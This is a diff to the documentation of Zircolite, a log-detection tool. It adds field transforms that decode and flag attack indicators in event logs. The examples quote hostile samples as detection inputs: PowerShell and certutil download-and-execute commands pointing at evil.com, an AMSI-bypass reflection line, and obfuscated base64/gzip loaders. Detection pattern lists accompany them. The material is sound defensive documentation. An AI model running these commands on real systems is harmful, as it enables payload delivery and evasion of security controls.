@@ -1,8 +1,446 @@
 # Advanced Use
 
+## Field Transforms
+
+Zircolite includes a **field transform system** that allows automatic enrichment and transformation of log field values during processing. Transforms are defined in `config/fieldMappings.yaml` and execute Python code in a sandboxed environment using RestrictedPython.
+
+### Overview
+
+Transforms can:
+- **Decode obfuscated data** (Base64, hex strings, URL encoding)
+- **Extract IOCs** (URLs, IPs, domains, registry paths)
+- **Detect attack indicators** (AMSI bypass, XOR encryption, shellcode patterns)
+- **Enrich fields** (extract usernames, categorize ports, identify LOLBins)
+- **Create alias fields** (add new fields without modifying originals)
+
+### Enabling Transforms
+
+Transforms require two settings in `fieldMappings.yaml`:
+
+```yaml
+transforms_enabled: true
+
+enabled_transforms:
+  # Auditd transforms (Linux)
+  - proctitle
+  - cmd
+  
+  # Base64 decoding
+  # - CommandLine_b64decoded
+  # - ScriptBlockText_b64decoded
+  
+  # Process analysis
+  # - Image_LOLBinMatch
+  # - Image_TyposquatDetect
+  
+  # Security hunting
+  # - CommandLine_AMSIBypass
+  # - CommandLine_DownloadCradle
+```
+
+Only transforms listed in `enabled_transforms` will run. Uncomment transforms you want to enable.
+
+### Available Transforms
+
+#### Auditd Transforms
+
+| Field | Alias Field | Description |
+|-------|-------------|-------------|
+| `proctitle` | *(modifies original)* | Converts hex-encoded proctitle to ASCII |
+| `cmd` | *(modifies original)* | Converts hex-encoded cmd to ASCII |
+
+#### CommandLine Transforms
+
+| Transform | Alias Field | Description |
+|-----------|-------------|-------------|
+| Base64 Decode | `CommandLine_b64decoded` | Decodes Base64 strings in command lines |
+| Credential Extraction | `CommandLine_Extracted_Creds` | Extracts credentials from net/wmic/psexec commands |
+| URL Extraction | `CommandLine_URLs` | Extracts HTTP/HTTPS/FTP URLs |
+| XOR Detection | `CommandLine_XORIndicators` | Detects XOR operations and extracts keys |
+| AMSI Bypass | `CommandLine_AMSIBypass` | Detects AMSI bypass techniques |
+| Hex Strings | `CommandLine_HexStrings` | Finds and decodes hex-encoded strings |
+| Env Var Obfuscation | `CommandLine_EnvVarObfuscation` | Detects environment variable abuse |
+| Download Cradles | `CommandLine_DownloadCradle` | Identifies download cradle patterns |
+| Evasion Techniques | `CommandLine_EvasionTechniques` | Detects process hollowing, injection, etc. |
+| Registry Paths | `CommandLine_RegistryPaths` | Extracts registry key paths |
+
+#### ScriptBlockText (PowerShell) Transforms
+
+| Transform | Alias Field | Description |
+|-----------|-------------|-------------|
+| Base64 Decode | `ScriptBlockText_b64decoded` | Decodes Base64 in PowerShell scripts |
+| Obfuscation Indicators | `ScriptBlockText_ObfuscationIndicators` | Detects char substitution, string concat, GzipStream, etc. |
+| XOR Patterns | `ScriptBlockText_XORPatterns` | Detects XOR keys and patterns |
+| .NET Reflection | `ScriptBlockText_ReflectionAbuse` | Detects reflection-based attacks |
+| Shellcode Indicators | `ScriptBlockText_ShellcodeIndicators` | Detects shellcode execution patterns |
+| Network IOCs | `ScriptBlockText_NetworkIOCs` | Extracts IPs, URLs, and domains |
+
+#### Process and Image Transforms
+
+| Field | Alias Field | Description |
+|-------|-------------|-------------|
+| `Image` | `Image_ExeName` | Extracts executable name from path |
+| `Image` | `Image_LOLBinMatch` | Detects Living Off The Land Binaries |
+| `Image` | `Image_TyposquatDetect` | Detects typosquatted process names (similar to legit Windows binaries) |
+| `ParentImage` | `ParentImage_ExeName` | Extracts parent executable name |
+
+#### User and Identity Transforms
+
+| Field | Alias Field | Description |
+|-------|-------------|-------------|
+| `User` | `User_Name` | Extracts username without domain (from `DOMAIN\user` or `user@domain`) |
+| `User` | `User_Domain` | Extracts domain from user field |
+
+#### Network Transforms
+
+| Field | Alias Field | Description |
+|-------|-------------|-------------|
+| `QueryName` | `QueryName_TLD` | Extracts TLD from DNS queries |
+| `QueryName` | `QueryName_EntropyScore` | Entropy score for DGA detection |
+| `QueryName` | `QueryName_TyposquatDetect` | Detects typosquatted official domains (gov, banks, tech) |
+| `DestinationIp` | `DestinationIp_ObfuscationCheck` | Detects hex/octal/decimal IP obfuscation |
+| `DestinationPort` | `DestinationPort_Category` | Categorizes ports (HTTP, SMB, RDP, METASPLOIT, etc.) |
+
+#### File and Registry Transforms
+
+| Field | Alias Field | Description |
+|-------|-------------|-------------|
+| `TargetFileName` | `TargetFileName_URLDecoded` | URL decodes file paths |
+| `TargetObject` | `TargetObject_SuspiciousRegistry` | Identifies persistence registry keys (Run, Services, IFEO, COM) |
+| `Payload` | `Payload_b64decoded` | Decodes Base64 in payload fields |
+| `ServiceFileName` | `ServiceFileName_b64decoded` | Decodes Base64 in service file names |
+
+#### Hash Transforms
+
+| Field | Alias Field | Description |
+|-------|-------------|-------------|
+| `Hashes` | `Hash_MD5` | Extracts MD5 hash from Sysmon Hashes field |
+| `Hashes` | `Hash_SHA256` | Extracts SHA256 hash from Sysmon Hashes field |
+
+### Transform Output Values Reference
+
+Transforms produce specific indicator values that can be used for filtering and hunting. Here's a reference of the values produced by each security transform:
+
+#### `ScriptBlockText_ObfuscationIndicators` Values
+
+| Value | Description |
+|-------|-------------|
+| `CHAR_SUBST` | Character substitution (e.g., `` `I`E`X ``) |
+| `STR_CONCAT` | String concatenation (e.g., `'Inv'+'oke'`) |
+| `JOIN_OP` | `-Join` operator obfuscation |
+| `FORMAT_STR` | Format string obfuscation (`-f`) |
+| `VAR_SUBST` | Variable substitution in strings (`${...}`) |
+| `ENC_CMD` | Encoded command (`-enc`, `-encodedcommand`) |
+| `GZIPSTREAM` | GzipStream compression |
+| `FROMBASE64` | FromBase64String method |
+| `IO_COMPRESSION` | IO.Compression namespace usage |
+| `DEFLATESTREAM` | DeflateStream compression |
+| `MEMORYSTREAM` | MemoryStream usage |
+
+#### `CommandLine_DownloadCradle` Values
+
+| Value | Description |
+|-------|-------------|
+| `DOWNLOADSTRING` | `DownloadString()` method |
+| `DOWNLOADFILE` | `DownloadFile()` method |
+| `DOWNLOADDATA` | `DownloadData()` method |
+| `INVOKE_WEBREQUEST` | `Invoke-WebRequest` / `iwr` |
+| `INVOKE_RESTMETHOD` | `Invoke-RestMethod` / `irm` |
+| `WEBCLIENT` | WebClient class usage |
+| `BITSTRANSFER` | BitsTransfer module |
+| `CERTUTIL_DOWNLOAD` | Certutil with `-urlcache` |
+| `BITSADMIN_DOWNLOAD` | Bitsadmin with `/transfer` |
+| `CURL_WGET` | curl or wget usage |
+
+#### `CommandLine_AMSIBypass` Values
+
+| Value | Description |
+|-------|-------------|
+| `AMSI_REF` | Any AMSI reference |
+| `AMSI_INIT_FAILED` | AmsiInitFailed bypass |
+| `AMSI_CONTEXT` | amsiContext manipulation |
+| `AMSI_SCAN_BUFFER` | AmsiScanBuffer bypass |
+| `AMSI_REFLECTION` | Reflection-based AMSI bypass |
+| `AMSI_DLL` | amsi.dll reference |
+
+#### `CommandLine_EvasionTechniques` Values
+
+| Value | Description |
+|-------|-------------|
+| `PROCESS_HOLLOWING` | NtUnmapViewOfSection / ZwUnmapViewOfSection |
+| `REFLECTIVE_DLL` | ReflectiveLoader pattern |
+| `TOKEN_MANIPULATION` | AdjustTokenPrivileges / SetThreadToken |
+| `MEMORY_ALLOC` | VirtualAlloc / NtAlloc / ZwAlloc |
+| `REMOTE_THREAD` | CreateRemoteThread |
+| `SYSCALL` | Direct syscall / ntdll usage |
+| `ETW_BYPASS` | ETW / NtTraceEvent bypass |
+
+#### `ScriptBlockText_ShellcodeIndicators` Values
+
+| Value | Description |
+|-------|-------------|
+| `EXEC_MEMORY_ALLOC` | VirtualAlloc with 0x40 (PAGE_EXECUTE_READWRITE) |
+| `KERNEL32_REF` | kernel32.dll reference |
+| `NTDLL_REF` | ntdll.dll reference |
+| `CREATE_THREAD` | CreateThread call |
+| `NOP_SLED` | NOP sled pattern (0x90, 0x90) |
+| `MEMORY_COPY` | Marshal.Copy / RtlMoveMemory / CopyMemory |
+| `POINTER_OP` | IntPtr / Marshal.AllocHGlobal |
+
+#### `TargetObject_SuspiciousRegistry` Values
+
+| Value | Description |
+|-------|-------------|
+| `RUN_KEY` | Run / RunOnce registry keys |
+| `SERVICE_KEY` | Services registry keys |
+| `IFEO` | Image File Execution Options |
+| `APPINIT_DLLS` | AppInit_DLLs |
+| `WINLOGON` | Winlogon registry keys |
+| `COM_HIJACK` | CLSID / InProcServer (COM hijacking) |
+| `SCHED_TASK` | Scheduled task cache |
+| `SECURITY_POLICY` | Security policies |
+
+#### `DestinationPort_Category` Values
+
+| Value | Description |
+|-------|-------------|
+| `HTTP` | Port 80 |
+| `HTTPS` | Port 443 |
+| `SMB` | Port 445 |
+| `RDP` | Port 3389 |
+| `SSH` | Port 22 |
+| `WINRM` | Ports 5985, 5986 |
+| `METASPLOIT_DEFAULT` | Port 4444 |
+| `ALT_HTTP` | Ports 8080, 8443 |
+| `EPHEMERAL` | Ports 49152+ |
+
+#### `Image_TyposquatDetect` Values
+
+| Value | Description |
+|-------|-------------|
+| `TYPOSQUAT:<process>(HOMOGLYPH)` | Homoglyph substitution (0→o, 1→l/i, rn→m, vv→w) |
+| `TYPOSQUAT:<process>(CHAR_ADD)` | Character addition at start/end |
+| `TYPOSQUAT:<process>(CHAR_OMIT)` | Character omission |
+| `TYPOSQUAT:<process>(CHAR_SWAP)` | Single character substitution |
+
+**Processes monitored**: svchost, lsass, csrss, services, explorer, powershell, cmd, certutil, rundll32, chrome, and other high-value targets.
+
+**False positive prevention**: The transform includes a comprehensive whitelist of ~100+ legitimate Windows executables (wevtutil, vssadmin, netstat, etc.) that will never be flagged, even if they have similar names to monitored processes.
+
+#### `QueryName_TyposquatDetect` Values
+
+| Value | Description |
+|-------|-------------|
+| `TYPOSQUAT_GOV_US:<domain>(...)` | US Government domain typosquat (irs, ssa, usps, fbi, etc.) |
+| `TYPOSQUAT_GOV_UK:<domain>(...)` | UK Government domain typosquat (hmrc, nhs, dvla) |
+| `TYPOSQUAT_GOV_EU:<domain>(...)` | EU Government domain typosquat |
+| `TYPOSQUAT_BANK:<domain>(...)` | Banking/Finance domain typosquat (chase, paypal, etc.) |
+| `TYPOSQUAT_CRYPTO:<domain>(...)` | Cryptocurrency domain typosquat (coinbase, binance) |
+| `TYPOSQUAT_TECH:<domain>(...)` | Tech company domain typosquat (microsoft, google, apple) |
+| `TYPOSQUAT_EMAIL:<domain>(...)` | Email provider domain typosquat (gmail, outlook) |
+| `TYPOSQUAT_CLOUD:<domain>(...)` | Cloud service domain typosquat (office365, azure, aws) |
+| `TYPOSQUAT_SECURITY:<domain>(...)` | Security vendor domain typosquat |
+| `TYPOSQUAT_SHIPPING:<domain>(...)` | Shipping company domain typosquat (fedex, ups, dhl) |
+| `SUSPICIOUS_TLD:<tld>` | Suspicious TLD combined with typosquat (tk, xyz, etc.) |
+
+**Techniques detected**:
+- `HOMOGLYPH` - Similar looking characters (0/o, 1/l/i, rn/m, vv/w)
+- `CHAR_MANIP` - Character addition or removal
+- `CHAR_SWAP` - Character substitution
+- `AFFIX` - Prefix/suffix added to legitimate domain
+- `EMBEDDED` - Legitimate domain embedded in longer string
+
+### Transform Examples
+
+#### Example 1: Detecting PowerShell Download Cradles
+
+When processing a PowerShell command like:
+```
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')"
+```
+
+The `CommandLine_DownloadCradle` transform produces:
+```
+DOWNLOADSTRING|WEBCLIENT
+```
+
+And `CommandLine_URLs` extracts:
+```
+http://evil.com/mal.ps1
+```
+
+#### Example 2: XOR Key Detection
+
+For a command containing XOR operations:
+```powershell
+$decoded = $bytes | ForEach-Object { $_ -bxor 0x35 }
+```
+
+The `ScriptBlockText_XORPatterns` transform detects:
+```
+XOR_KEY:0x35|XOR_LOOP|COMMON_XOR_KEY:0x35
+```
+
+#### Example 3: AMSI Bypass Detection
+
+When AMSI bypass code is detected:
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+```
+
+The `CommandLine_AMSIBypass` transform flags:
+```
+AMSI_REF|AMSI_REFLECTION
+```
+
+#### Example 4: LOLBin Detection
+
+For a process execution:
+```
+C:\Windows\System32\certutil.exe -urlcache -split -f http://evil.com/file.exe
+```
+
+The `Image_LOLBinMatch` transform identifies:
+```
+LOLBIN:certutil
+```
+
+#### Example 5: Detecting Compressed/Encoded PowerShell
+
+For obfuscated PowerShell using compression:
+```powershell
+[IO.Compression.GzipStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($data)))
+```
+
+The `ScriptBlockText_ObfuscationIndicators` transform flags:
+```
+GZIPSTREAM|MEMORYSTREAM|FROMBASE64|IO_COMPRESSION
+```
+
+#### Example 6: Network IOC Extraction
+
+For a script containing network indicators:
+```powershell
+$client.DownloadFile("http://192.168.1.100:8080/payload.exe", "C:\temp\payload.exe")
+```
+
+The `ScriptBlockText_NetworkIOCs` transform extracts:
+```
+IP:192.168.1.100|URL:http://192.168.1.100:8080/payload.exe
+```
+
+#### Example 7: Process Typosquatting Detection
+
+When a malicious process tries to masquerade as a legitimate Windows binary:
+```
+C:\Users\Public\svch0st.exe
+```
+
+The `Image_TyposquatDetect` transform identifies:
+```
+TYPOSQUAT:svchost(HOMOGLYPH)
+```
+
+Other examples:
+- `1sass.exe` → `TYPOSQUAT:lsass(HOMOGLYPH)`
+- `chr0me.exe` → `TYPOSQUAT:chrome(HOMOGLYPH)`
+- `svchosts.exe` → `TYPOSQUAT:svchost(CHAR_ADD)`
+- `powersh3ll.exe` → `TYPOSQUAT:powershell(HOMOGLYPH)`
+
+**Note**: Legitimate Windows tools like `wevtutil.exe` will NOT be flagged as typosquats of `certutil.exe` due to the built-in whitelist.
+
+#### Example 8: Domain Typosquatting Detection
+
+When DNS queries reveal potential phishing domains:
+```
+micros0ft-support.xyz
+```
+
+The `QueryName_TyposquatDetect` transform identifies:
+```
+TYPOSQUAT_TECH:microsoft(HOMOGLYPH,CHAR_SWAP)|SUSPICIOUS_TLD:xyz
+```
+
+Other examples:
+- `paypa1.com` → `TYPOSQUAT_BANK:paypal(HOMOGLYPH)`
+- `irs-gov.tk` → `TYPOSQUAT_GOV_US:irs(AFFIX)|SUSPICIOUS_TLD:tk`
+- `arnazon.com` → `TYPOSQUAT_TECH:amazon(CHAR_SWAP)`
+- `gooogle.com` → `TYPOSQUAT_TECH:google(CHAR_MANIP)`
+- `nhs-uk.info` → `TYPOSQUAT_GOV_UK:nhs(AFFIX)`
+
+### Querying Transform Results
+
+Transform alias fields are stored in the database and can be queried with SQL or SIGMA rules:
+
+```sql
+-- Find commands with download cradles
+SELECT * FROM logs WHERE CommandLine_DownloadCradle != ''
+
+-- Find PowerShell with XOR operations
+SELECT * FROM logs WHERE ScriptBlockText_XORPatterns LIKE '%XOR_KEY%'
+
+-- Find AMSI bypass attempts
+SELECT * FROM logs WHERE CommandLine_AMSIBypass LIKE '%AMSI%'
+
+-- Find high-entropy DNS queries (potential DGA)
+SELECT * FROM logs WHERE CAST(QueryName_EntropyScore AS REAL) > 75
+
+-- Find typosquatted process names (masquerading)
+SELECT * FROM logs WHERE Image_TyposquatDetect != ''
+
+-- Find typosquatted government domains (phishing)
+SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%GOV_%'
+
+-- Find typosquatted banking domains
+SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%BANK%'
+
+-- Find domain typosquats with suspicious TLDs
+SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%SUSPICIOUS_TLD%'
+```
+
+### Creating Custom Transforms
+
+You can add custom transforms in `fieldMappings.yaml`:
+
+```yaml
+transforms:
+  MyField:
+    - info: "Description of transform"
+      type: python
+      code: |
+        def transform(param):
+            # Your Python code here
+            # param contains the field value
+            # Return the transformed value
+            return transformed_value
+      alias: true  # Create new field (true) or modify original (false)
+      alias_name: "MyField_Transformed"
+      source_condition:
+        - evtx_input
+        - json_input
+      enabled: true
+```
+
+#### Available Modules in Transforms
+
+The following modules are available in the sandboxed environment:
+- `base64` - Base64 encoding/decoding
+- `re` - Regular expressions
+- `chardet` - Character encoding detection
+
+#### Transform Best Practices
+
+1. **Keep transforms fast** - They run on every matching event
+2. **Return empty string on no match** - Makes filtering easier
+3. **Use aliases for new data** - Don't modify original evidence
+4. **Handle exceptions** - Return original value on error
+5. **Limit output size** - Truncate long results
+
+---
+
 ## Working with Large Datasets
 
-Zircolite tries to be as fast as possible while managing memory efficiently. The tool now processes each log file separately in its own database by default, which significantly improves memory usage for large datasets.
+Zircolite processes each log file separately in its own database by default, which reduces memory usage for large datasets.
 
 ### Automatic Processing Optimization
 
@@ -84,7 +522,7 @@ python3 zircolite.py --evtx logs/ --ruleset rules.json --parallel-memory-limit 8
 
 ### Streaming Mode
 
-Zircolite includes a **streaming mode** (enabled by default) that provides significantly faster processing by combining extraction, flattening, and database insertion into a single pass.
+Zircolite includes a **streaming mode** (enabled by default) that combines extraction, flattening, and database insertion into a single pass.
 
 #### How Streaming Mode Works
 
@@ -98,7 +536,7 @@ Zircolite includes a **streaming mode** (enabled by default) that provides signi
 1. Extract logs → Flatten immediately → Insert directly to database in batches
 2. Execute rules
 
-This eliminates intermediate file I/O, avoids double JSON parsing, and reduces memory usage (typically 40-60% faster).
+This eliminates intermediate file I/O and avoids double JSON parsing.
 
 #### When Streaming Mode is Used
 
@@ -136,10 +574,39 @@ There are several ways to speed up Zircolite:
 - Let automatic optimization do its work (enabled by default).
 - Use [Filtering](#filtering) to process only relevant files.
 - Use the `--no-recursion` option if you don't need recursive directory search.
+- **Early event filtering** - Zircolite automatically skips events that won't match any rules based on Channel and EventID.
 - For extreme cases with very large datasets, use GNU Parallel for external parallelization.
 
+### Early Event Filtering
+
+Zircolite includes an **early event filtering** mechanism that skips events before processing operations. This feature:
+
+1. **Extracts Channel and EventID** values from all loaded rules
+2. **Filters events early** - before flattening and database insertion
+3. **Supports multiple log formats** - EVTX, JSON, XML, CSV, and more
+
+The event filter uses configurable field paths to extract Channel and EventID from different log structures:
+- Standard EVTX: `Event.System.Channel`, `Event.System.EventID`
+- Pre-flattened JSON: `Channel`, `EventID`
+- ECS/Elasticsearch: `winlog.channel`, `event.code`
+- And many more (configurable in `config/fieldMappings.yaml`)
+
+```shell
+# Event filtering is enabled by default
+# You'll see a log message like:
+# [+] Event filter enabled: 15 channels, 45 eventIDs
+
+# Disable event filtering if needed
+python3 zircolite.py --evtx logs/ --ruleset rules.json --no-event-filter
+
+# Apply filtering to non-Windows log sources too
+python3 zircolite.py --evtx logs/ --ruleset rules.json --filter-all-sources
+```
+
+The event filter statistics are displayed in the summary panel after processing.
+
 > [!NOTE]  
-> There is an option to use an on-disk database instead of in-memory by using the `--ondiskdb <DB_NAME>` argument. This is only useful to avoid errors when dealing with very large datasets and if you have a lot of time... **This should be used with caution, and the alternatives below are far better choices.**
+> There is an option to use an on-disk database instead of in-memory by using the `--ondiskdb <DB_NAME>` argument. This is useful for very large datasets but is slower. **Consider the alternatives below first.**
 
 ### Using GNU Parallel
 
@@ -153,7 +620,7 @@ On Linux or macOS, you can use **GNU Parallel** to launch multiple Zircolite ins
 
 - **"DFIR Case Mode": One directory per computer/endpoint**
 
-	This mode is very useful when you have a case where all your evidence is stored per computer (one directory per computer containing all EVTX files for that computer). It will create one result file per computer in the current directory.
+	This mode is useful when your evidence is stored per computer (one directory per computer containing all EVTX files for that computer). It will create one result file per computer in the current directory.
 
 	```shell
 	find <CASE_DIRECTORY> -maxdepth 1 -mindepth 1 -type d | \
@@ -186,7 +653,7 @@ On Linux or macOS, you can use **GNU Parallel** to launch multiple Zircolite ins
 
 ## Filtering
 
-Zircolite has many filtering options to speed up the detection process. Don't overlook these options because they can save you a lot of time.
+Zircolite provides several filtering options to reduce processing time.
 
 ### File Filters
 
